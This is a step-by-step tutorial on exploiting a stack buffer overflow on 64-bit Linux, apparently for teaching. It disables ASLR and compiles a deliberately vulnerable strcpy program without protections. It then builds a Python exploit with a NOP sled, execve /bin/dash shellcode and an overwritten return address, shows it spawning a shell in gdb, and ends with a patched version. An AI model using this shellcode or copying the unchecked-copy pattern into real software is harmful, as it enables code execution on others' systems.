# Buffer overflow in linux x64.

## Introduction
The purpose of this demonstration is to understand how the buffer overflow and its exploitation works on linux 64 bit.

## Prerequisite
* Linux( Ubuntu/Kali or any *nix ) 64 bit machine
* Patience

## Step 1:
First lets disable the ASLR so that we won't get new address every time we run the program.
```
~$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

```
## Step 2:

Create a vulnerable c program *_vulnerable.c_*

```c
#include<stdio.h>
#include<string.h>

int vulnerable_function(char * argv)
{
char buff[30];
strcpy(buff,argv);// copy the input string wthout checking the string length
printf("String copied successfully");
return 0;
}

int main(int argc, char *argv[])
{
  vulnerable_function(argv[1]);  

    return 0;
}
```
* ### Lets compile the above code without stack canary and DEP(enabling stack for execution).

```bash
~$ gcc -z execstack -fno-stack-protector vulnerable.c -o vulnerable

# -z execstack for making stack executable
# -fno-stack-protector for disabling stack canary

```

* ### Run the binary

```
~$ ./vulnerable AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```
* By running we can see segmentation fault
```bash
Segmentation fault (core dumped)

```
* ### Lets run it in gdb to trace the issue
```bash
~$ gdb -q ./vulnerable

#q: quietly

```
Set disassembly type intel using following command in gdb
```bash
(gdb) set disassembly-flavor intel
```
Disassemble both the functions
```bash

(gdb) disassemble main
Dump of assembler code for function main:
   0x00000000004005b2 <+0>:	push   rbp
   0x00000000004005b3 <+1>:	mov    rbp,rsp
   0x00000000004005b6 <+4>:	sub    rsp,0x10
   0x00000000004005ba <+8>:	mov    DWORD PTR [rbp-0x4],edi
   0x00000000004005bd <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x00000000004005c1 <+15>:	mov    rax,QWORD PTR [rbp-0x10]
   0x00000000004005c5 <+19>:	add    rax,0x8
   0x00000000004005c9 <+23>:	mov    rax,QWORD PTR [rax]
   0x00000000004005cc <+26>:	mov    rdi,rax
   0x00000000004005cf <+29>:	call   0x40057d <vulnerable_function>
   0x00000000004005d4 <+34>:	mov    eax,0x0
   0x00000000004005d9 <+39>:	leave  
   0x00000000004005da <+40>:	ret    
End of assembler dump.
(gdb) disassemble vulnerable_function
Dump of assembler code for function vulnerable_function:
   0x000000000040057d <+0>:	push   rbp
   0x000000000040057e <+1>:	mov    rbp,rsp
   0x0000000000400581 <+4>:	sub    rsp,0x30
   0x0000000000400585 <+8>:	mov    QWORD PTR [rbp-0x28],rdi
   0x0000000000400589 <+12>:	mov    rdx,QWORD PTR [rbp-0x28]
   0x000000000040058d <+16>:	lea    rax,[rbp-0x20]
   0x0000000000400591 <+20>:	mov    rsi,rdx
   0x0000000000400594 <+23>:	mov    rdi,rax
   0x0000000000400597 <+26>:	call   0x400450 <strcpy@plt>
   0x000000000040059c <+31>:	mov    edi,0x400664
   0x00000000004005a1 <+36>:	mov    eax,0x0
   0x00000000004005a6 <+41>:	call   0x400460 <printf@plt>
   0x00000000004005ab <+46>:	mov    eax,0x0
   0x00000000004005b0 <+51>:	leave  
   0x00000000004005b1 <+52>:	ret    
```
Here we need to set a break point in vulnerabale_function before copy at line no <+26> so that we can see what happens before and after copy inside the stack.

```
b *vulnerable_function+26

```
Now run the program with input: ``AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA``

```
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
Now lets trace the stack frame

```
(gdb) x $rsp
0x7fffffffde80:	0xf7ffe1c8
(gdb) x $rbp
0x7fffffffdeb0:	0xffffded0
(gdb) x/128x $rsp
        +------------------< rsp
        |
       \|/
+---------------+
|0x7fffffffde80:| 0xf7ffe1c8 0x00007fff	0xffffe33a 0x00007fff
+---------------+
0x7fffffffde90:	  0x00000001	0x00000000	0x0040062d	0x00000000
0x7fffffffdea0:	  0xffffded0	0x00007fff	0x00000000	0x00000000
+---------------+
|0x7fffffffdeb0:| 0xffffded0	0x00007fff	0x004005d4 0x00000000
+---------------+
        /|\
         |
         +----------------------< rbp
0x7fffffffdec0:	0xffffdfb8	0x00007fff	0x00000000	0x00000002
0x7fffffffded0:	0x00000000	0x00000000	0xf7a35ec5	0x00007fff
0x7fffffffdee0:	0x00000000	0x00000000	0xffffdfb8	0x00007fff
0x7fffffffdef0:	0x00000000	0x00000002	0x004005b2	0x00000000
0x7fffffffdf00:	0x00000000	0x00000000	0x6b24b8b3	0x9c65af34
0x7fffffffdf10:	0x00400490	0x00000000	0xffffdfb0	0x00007fff
0x7fffffffdf20:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdf30:	0xd6e4b8b3	0x639a50cb	0xd7deb8b3	0x639a4072
0x7fffffffdf40:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdf50:	0x00000000	0x00000000	0x004005e0	0x00000000
0x7fffffffdf60:	0xffffdfb8	0x00007fff	0x00000002	0x00000000
0x7fffffffdf70:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdf80:	0x00400490	0x00000000	0xffffdfb0	0x00007fff
0x7fffffffdf90:	0x00000000	0x00000000	0x004004b9	0x00000000
0x7fffffffdfa0:	0xffffdfa8	0x00007fff	0x0000001c	0x00000000
0x7fffffffdfb0:	0x00000002	0x00000000	0xffffe318	0x00007fff
0x7fffffffdfc0:	0xffffe33a	0x00007fff	0x00000000	0x00000000
0x7fffffffdfd0:	0xffffe383	0x00007fff	0xffffe38e	0x00007fff
0x7fffffffdfe0:	0xffffe3a0	0x00007fff	0xffffe3d2	0x00007fff
0x7fffffffdff0:	0xffffe3e3	0x00007fff	0xffffe3f9	0x00007fff
0x7fffffffe000:	0xffffe408	0x00007fff	0xffffe43d	0x00007fff
0x7fffffffe010:	0xffffe44e	0x00007fff	0xffffe465	0x00007fff
0x7fffffffe020:	0xffffe475	0x00007fff	0xffffe480	0x00007fff
0x7fffffffe030:	0xffffe492	0x00007fff	0xffffe4c6	0x00007fff
0x7fffffffe040:	0xffffe50a	0x00007fff	0xffffe539	0x00007fff
0x7fffffffe050:	0xffffe545	0x00007fff	0xffffea66	0x00007fff
0x7fffffffe060:	0xffffeaa0	0x00007fff	0xffffead4	0x00007fff
0x7fffffffe070:	0xffffeb04	0x00007fff	0xffffeb37	0x00007fff
```
* Execute the next instruction
```
(gdb) nexti
```
* Lets examine the stack frame

```
(gdb) x/128x $rsp
        +------------------< rsp
        |
       \|/
+---------------+
|0x7fffffffde80:|	0xf7ffe1c8	0x00007fff	0xffffe33a	0x00007fff
+---------------+
0x7fffffffde90:	  0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdea0:	  0x41414141	0x41414141	0x41414141	0x41414141
+---------------+
|0x7fffffffdeb0:|	0x41414141	0x41414141	0x41414141	0x41414141
+---------------+
        /|\
         |
         +----------------------< rbp

0x7fffffffdec0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffded0:	0x41414141	0x41414141	0xf7a35e00	0x00007fff
0x7fffffffdee0:	0x00000000	0x00000000	0xffffdfb8	0x00007fff
0x7fffffffdef0:	0x00000000	0x00000002	0x004005b2	0x00000000
0x7fffffffdf00:	0x00000000	0x00000000	0x6b24b8b3	0x9c65af34
0x7fffffffdf10:	0x00400490	0x00000000	0xffffdfb0	0x00007fff
0x7fffffffdf20:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdf30:	0xd6e4b8b3	0x639a50cb	0xd7deb8b3	0x639a4072
0x7fffffffdf40:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdf50:	0x00000000	0x00000000	0x004005e0	0x00000000
0x7fffffffdf60:	0xffffdfb8	0x00007fff	0x00000002	0x00000000
0x7fffffffdf70:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdf80:	0x00400490	0x00000000	0xffffdfb0	0x00007fff
0x7fffffffdf90:	0x00000000	0x00000000	0x004004b9	0x00000000
0x7fffffffdfa0:	0xffffdfa8	0x00007fff	0x0000001c	0x00000000
0x7fffffffdfb0:	0x00000002	0x00000000	0xffffe318	0x00007fff
0x7fffffffdfc0:	0xffffe33a	0x00007fff	0x00000000	0x00000000
0x7fffffffdfd0:	0xffffe383	0x00007fff	0xffffe38e	0x00007fff
0x7fffffffdfe0:	0xffffe3a0	0x00007fff	0xffffe3d2	0x00007fff
0x7fffffffdff0:	0xffffe3e3	0x00007fff	0xffffe3f9	0x00007fff
0x7fffffffe000:	0xffffe408	0x00007fff	0xffffe43d	0x00007fff
0x7fffffffe010:	0xffffe44e	0x00007fff	0xffffe465	0x00007fff
0x7fffffffe020:	0xffffe475	0x00007fff	0xffffe480	0x00007fff
0x7fffffffe030:	0xffffe492	0x00007fff	0xffffe4c6	0x00007fff
0x7fffffffe040:	0xffffe50a	0x00007fff	0xffffe539	0x00007fff
0x7fffffffe050:	0xffffe545	0x00007fff	0xffffea66	0x00007fff
0x7fffffffe060:	0xffffeaa0	0x00007fff	0xffffead4	0x00007fff
0x7fffffffe070:	0xffffeb04	0x00007fff	0xffffeb37	0x00007fff
```

* Here we can see that content of rpb got overwritten by 41414141 which is actually our input AAAA.
* Lets see how many A's required to control rbp(it is easy using pattern generator, will discuss in upcoming blogs)
* Lets run it again with input AAAAAAAAAAAAAAAAAAAAAAAA0000111122223333444455556666.<br>

```bash
run AAAAAAAAAAAAAAAAAAAAAAAA0000111122223333444455556666
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/ubuntu/buffoflow/vulnerable AAAAAAAAAAAAAAAAAAAAAAAA0000111122223333444455556666
Breakpoint 1, 0x0000000000400597 in vulnerable_function ()
```

* Continue the execution of program

```bash
(gdb) continue
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x00000000004005b1 in vulnerable_function ()
```

* From the generated output notice that there is segmentation fault.
* Lets examine the register.

```bash
(gdb) info registers
rax            0x0	0
rbx            0x0	0
rcx            0x400	1024
rdx            0x7ffff7dd59e0	140737351866848
rsi            0x7ffff7ff5000	140737354092544
rdi            0x7ffff7ff501a	140737354092570
rbp            0x3333333332323232	0x3333333332323232
rsp            0x7fffffffdec8	0x7fffffffdec8
r8             0xffffffff	4294967295
r9             0x0	0
r10            0x22	34
r11            0x246	582
r12            0x400490	4195472
r13            0x7fffffffdfc0	140737488347072
r14            0x0	0
r15            0x0	0
rip            0x4005b1	0x4005b1 <vulnerable_function+52>
eflags         0x10206	[ PF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
```
<br>
* Here we can see that the content of ``rbp`` got overwritten with ``0x3333333332323232`` which is ``33332222`` in decimal, and  ``Little Endian`` notation of ``22223333``.<br>
* Here unlike ``32 bit`` we can not take direct control on ``rip``, but ``rbp``.<br>
* Now from the given input we can conclude that a total of ``32 A's`` required + some ``64 bit valid address`` in order to control rip and jump to some arbitrary address. <br>
* Lets create a python program which will print ``32 A's and 8 B's``<br>
input.py

```python
#!/usr/bin/python
buff='\x41'*32
buff+='\x42'*8
print buff
```

* Now lets run again the above code in gdb.<br>

```bash
(gdb) run $(python input)
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/ubuntu/buffoflow/vulnerable $(python input)

Breakpoint 1, 0x0000000000400597 in vulnerable_function ()
(gdb) nexti

Breakpoint 2, 0x000000000040059c in vulnerable_function ()
(gdb) x/128x rsp
No symbol "rsp" in current context.
(gdb) x/128x $rsp
0x7fffffffdea0:	0xf7ffe1c8	0x00007fff	0xffffe35a	0x00007fff
0x7fffffffdeb0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdec0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffded0:	0x42424242	0x42424242	0x00400500	0x00000000
0x7fffffffdee0:	0xffffdfd8	0x00007fff	0x00000000	0x00000002
0x7fffffffdef0:	0x00000000	0x00000000	0xf7a35ec5	0x00007fff
0x7fffffffdf00:	0x00000000	0x00000000	0xffffdfd8	0x00007fff
0x7fffffffdf10:	0x00000000	0x00000002	0x004005b2	0x00000000
0x7fffffffdf20:	0x00000000	0x00000000	0xbbbf4969	0x01ba7325
0x7fffffffdf30:	0x00400490	0x00000000	0xffffdfd0	0x00007fff
0x7fffffffdf40:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdf50:	0x05bf4969	0xfe458cda	0x07454969	0xfe459c63
0x7fffffffdf60:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdf70:	0x00000000	0x00000000	0x004005e0	0x00000000
0x7fffffffdf80:	0xffffdfd8	0x00007fff	0x00000002	0x00000000
0x7fffffffdf90:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdfa0:	0x00400490	0x00000000	0xffffdfd0	0x00007fff
0x7fffffffdfb0:	0x00000000	0x00000000	0x004004b9	0x00000000
0x7fffffffdfc0:	0xffffdfc8	0x00007fff	0x0000001c	0x00000000
0x7fffffffdfd0:	0x00000002	0x00000000	0xffffe338	0x00007fff
0x7fffffffdfe0:	0xffffe35a	0x00007fff	0x00000000	0x00000000
0x7fffffffdff0:	0xffffe383	0x00007fff	0xffffe38e	0x00007fff
0x7fffffffe000:	0xffffe3a0	0x00007fff	0xffffe3d2	0x00007fff
0x7fffffffe010:	0xffffe3e3	0x00007fff	0xffffe3f9	0x00007fff
0x7fffffffe020:	0xffffe408	0x00007fff	0xffffe43d	0x00007fff
0x7fffffffe030:	0xffffe44e	0x00007fff	0xffffe465	0x00007fff
0x7fffffffe040:	0xffffe475	0x00007fff	0xffffe480	0x00007fff
0x7fffffffe050:	0xffffe492	0x00007fff	0xffffe4c6	0x00007fff
0x7fffffffe060:	0xffffe50a	0x00007fff	0xffffe539	0x00007fff
0x7fffffffe070:	0xffffe545	0x00007fff	0xffffea66	0x00007fff
0x7fffffffe080:	0xffffeaa0	0x00007fff	0xffffead4	0x00007fff
0x7fffffffe090:	0xffffeb04	0x00007fff	0xffffeb37	0x00007fff
(gdb) x $rsp
0x7fffffffdea0:	0xf7ffe1c8
(gdb) x $rbp
0x7fffffffded0:	0x42424242
```

Here we can see that ``rbp`` got overwritten by 0x4242424242424242

* Lets write the final exploit
    * Here in final exploit, we will fill the buffer with shellcode and jump to that address by overwritting return address.<br>

    * I got a shellcode which is less than 32 Byte for /bin/dash from source: <br>http://shell-storm.org/shellcode/files/shellcode-806.php<br>
* Fill the buffer in following way<br>
+-------------+-----------------+---------------------+<br>
|&nbsp;&nbsp;&nbsp;&nbsp;Nop Sled&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;ShellCode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;Return Address&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+-------------+-----------------+---------------------+<br>

* Return address should be in such a way that it should point to start of the buffer.<br>

```bash

         |                       |
         |                       |
         |                       |
    +--->+-----------------------+
    |    |                       |
    |    |       Nop Sleds       |
    |    +-----------------------+
    |    |       Shell Code      |
    |    |                       |
    |    +-----------------------+
    |    |                       |
    |    |     Return Address    |<-------- rbp
    |    +-----------------------+
    |    |           |           |
    |    |           |           |
    +----|-----------+           |
         |                       |
         |                       |
         |                       |

```

```python
#!/usr/bin/python

shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # shell code for /bin/dash
# source: http://shell-storm.org/shellcode/files/shellcode-806.php
nops="\x90"*(32-len(shellcode)) # nop sled
ret_add="\xa0\xde\xff\xff\xff\x7f" #address of buffer from where input is filled in buffer
payload=nops+shellcode+ret_add
print payload

```

As our final exploit is ready, lets rerun the program by feeding the output of the above python script in our code.

```bash
(gdb) run $(python input)
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/ubuntu/buffoflow/vulnerable $(python input)

Breakpoint 1, 0x0000000000400597 in vulnerable_function ()
(gdb) x/128x $rsp
0x7fffffffdea0:	0xf7ffe1c8	0x00007fff	0xffffe35c	0x00007fff
0x7fffffffdeb0:	0x00000001	0x00000000	0x0040062d	0x00000000
0x7fffffffdec0:	0xffffdef0	0x00007fff	0x00000000	0x00000000
0x7fffffffded0:	0xffffdef0	0x00007fff	0x004005d4	0x00000000
0x7fffffffdee0:	0xffffdfd8	0x00007fff	0x00000000	0x00000002
0x7fffffffdef0:	0x00000000	0x00000000	0xf7a35ec5	0x00007fff
0x7fffffffdf00:	0x00000000	0x00000000	0xffffdfd8	0x00007fff
0x7fffffffdf10:	0x00000000	0x00000002	0x004005b2	0x00000000
0x7fffffffdf20:	0x00000000	0x00000000	0xc2626996	0x8ac7dcae
0x7fffffffdf30:	0x00400490	0x00000000	0xffffdfd0	0x00007fff
0x7fffffffdf40:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdf50:	0x7c626996	0x75382351	0x7e986996	0x753833e8
0x7fffffffdf60:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdf70:	0x00000000	0x00000000	0x004005e0	0x00000000
0x7fffffffdf80:	0xffffdfd8	0x00007fff	0x00000002	0x00000000
0x7fffffffdf90:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdfa0:	0x00400490	0x00000000	0xffffdfd0	0x00007fff
0x7fffffffdfb0:	0x00000000	0x00000000	0x004004b9	0x00000000
0x7fffffffdfc0:	0xffffdfc8	0x00007fff	0x0000001c	0x00000000
0x7fffffffdfd0:	0x00000002	0x00000000	0xffffe33a	0x00007fff
0x7fffffffdfe0:	0xffffe35c	0x00007fff	0x00000000	0x00000000
0x7fffffffdff0:	0xffffe383	0x00007fff	0xffffe38e	0x00007fff
0x7fffffffe000:	0xffffe3a0	0x00007fff	0xffffe3d2	0x00007fff
0x7fffffffe010:	0xffffe3e3	0x00007fff	0xffffe3f9	0x00007fff
0x7fffffffe020:	0xffffe408	0x00007fff	0xffffe43d	0x00007fff
0x7fffffffe030:	0xffffe44e	0x00007fff	0xffffe465	0x00007fff
0x7fffffffe040:	0xffffe475	0x00007fff	0xffffe480	0x00007fff
0x7fffffffe050:	0xffffe492	0x00007fff	0xffffe4c6	0x00007fff
0x7fffffffe060:	0xffffe50a	0x00007fff	0xffffe539	0x00007fff
0x7fffffffe070:	0xffffe545	0x00007fff	0xffffea66	0x00007fff
0x7fffffffe080:	0xffffeaa0	0x00007fff	0xffffead4	0x00007fff
0x7fffffffe090:	0xffffeb04	0x00007fff	0xffffeb37	0x00007fff
(gdb) nexti

Breakpoint 2, 0x000000000040059c in vulnerable_function ()
(gdb) x/128x $rsp
0x7fffffffdea0:	0xf7ffe1c8	0x00007fff	0xffffe35c	0x00007fff
0x7fffffffdeb0:	0x90909090	0x48c03190	0x969dd1bb	0x978cd091
0x7fffffffdec0:	0xdbf748ff	0x995f5453	0x5e545752	0x050f3bb0
0x7fffffffded0:	0xffffdea0	0x00007fff	0x004005d4	0x00000000
0x7fffffffdee0:	0xffffdfd8	0x00007fff	0x00000000	0x00000002
0x7fffffffdef0:	0x00000000	0x00000000	0xf7a35ec5	0x00007fff
0x7fffffffdf00:	0x00000000	0x00000000	0xffffdfd8	0x00007fff
0x7fffffffdf10:	0x00000000	0x00000002	0x004005b2	0x00000000
0x7fffffffdf20:	0x00000000	0x00000000	0xc2626996	0x8ac7dcae
0x7fffffffdf30:	0x00400490	0x00000000	0xffffdfd0	0x00007fff
0x7fffffffdf40:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdf50:	0x7c626996	0x75382351	0x7e986996	0x753833e8
0x7fffffffdf60:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdf70:	0x00000000	0x00000000	0x004005e0	0x00000000
0x7fffffffdf80:	0xffffdfd8	0x00007fff	0x00000002	0x00000000
0x7fffffffdf90:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdfa0:	0x00400490	0x00000000	0xffffdfd0	0x00007fff
0x7fffffffdfb0:	0x00000000	0x00000000	0x004004b9	0x00000000
0x7fffffffdfc0:	0xffffdfc8	0x00007fff	0x0000001c	0x00000000
0x7fffffffdfd0:	0x00000002	0x00000000	0xffffe33a	0x00007fff
0x7fffffffdfe0:	0xffffe35c	0x00007fff	0x00000000	0x00000000
0x7fffffffdff0:	0xffffe383	0x00007fff	0xffffe38e	0x00007fff
0x7fffffffe000:	0xffffe3a0	0x00007fff	0xffffe3d2	0x00007fff
0x7fffffffe010:	0xffffe3e3	0x00007fff	0xffffe3f9	0x00007fff
0x7fffffffe020:	0xffffe408	0x00007fff	0xffffe43d	0x00007fff
0x7fffffffe030:	0xffffe44e	0x00007fff	0xffffe465	0x00007fff
0x7fffffffe040:	0xffffe475	0x00007fff	0xffffe480	0x00007fff
0x7fffffffe050:	0xffffe492	0x00007fff	0xffffe4c6	0x00007fff
0x7fffffffe060:	0xffffe50a	0x00007fff	0xffffe539	0x00007fff
0x7fffffffe070:	0xffffe545	0x00007fff	0xffffea66	0x00007fff
0x7fffffffe080:	0xffffeaa0	0x00007fff	0xffffead4	0x00007fff
0x7fffffffe090:	0xffffeb04	0x00007fff	0xffffeb37	0x00007fff
(gdb) c
Continuing.

Breakpoint 3, 0x00000000004005b0 in vulnerable_function ()
(gdb) c
Continuing.
process 3607 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 3: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "vulnerable_function" in current context.
Error in re-setting breakpoint 2: No symbol "vulnerable_function" in current context.
Error in re-setting breakpoint 3: No symbol "vulnerable_function" in current context.
Error in re-setting breakpoint 1: No symbol "vulnerable_function" in current context.
Error in re-setting breakpoint 2: No symbol "vulnerable_function" in current context.
Error in re-setting breakpoint 3: No symbol "vulnerable_function" in current context.
Error in re-setting breakpoint 1: No symbol "vulnerable_function" in current context.
Error in re-setting breakpoint 2: No symbol "vulnerable_function" in current context.
Error in re-setting breakpoint 3: No symbol "vulnerable_function" in current context.
$ whoami
ubuntu


```
* Finally we got the shell.

```
                                +------------> Nop Sled  
                                |
+--->0x7fffffffdea0:  0xf7ffe1c8|	0x00007fff	0xffffe35c	0x00007fff
|                     +---------|-+----------------------------------+
|    0x7fffffffdeb0:  |0x90909090 |0x48c03190 0x969dd1bb 0x978cd091  |
|                     +-----------|                                  |<------- ShellCode
|                     +-----------|                                  |
|    0x7fffffffdec0:  |0xdbf748ff 0x995f5453 0x5e545752 0x050f3bb0   |
|                     +----------------------+-----------------------+
|    0x7fffffffded0:  |0xffffdea0 0x00007fff | 0x004005d4 0x00000000
|                     +----------------------+
|                            |         /|\
|                            |          |
+----------------------------+          +---------------< Return Address
0x7fffffffdee0:	0xffffdfd8	0x00007fff	0x00000000	0x00000002
0x7fffffffdef0:	0x00000000	0x00000000	0xf7a35ec5	0x00007fff
0x7fffffffdf00:	0x00000000	0x00000000	0xffffdfd8	0x00007fff
0x7fffffffdf10:	0x00000000	0x00000002	0x004005b2	0x00000000
0x7fffffffdf20:	0x00000000	0x00000000	0xc2626996	0x8ac7dcae
0x7fffffffdf30:	0x00400490	0x00000000	0xffffdfd0	0x00007fff
0x7fffffffdf40:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdf50:	0x7c626996	0x75382351	0x7e986996	0x753833e8

```
## How to overcome from this kind of problem ?
    Sol: Always check the length of the buffer before copy into buffer

patched.c
```c
#include<stdio.h>
#include<string.h>

int vulnerable_function(char * argv)
{
char buff[30];
if(0 < strlen(argv) && strlen(argv)<30 ){
strcpy(buff,argv);// copy the input string after sanitizing
printf("String copied successfully");
}
else{printf("Please enter the string within limit");}

return 0;
}

int main(int argc, char *argv[])
{
  vulnerable_function(argv[1]);  

    return 0;
}
```
Compile and run with same input
```

ubuntu@ubuntu:~/buffoflow$ gcc -z execstack -fno-stack-protector patched.c -o patched
ubuntu@ubuntu:~/buffoflow$ ./patched AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Please enter the string within limitubuntu@ubuntu:~/buffoflow$

```


# Thanks for reading !




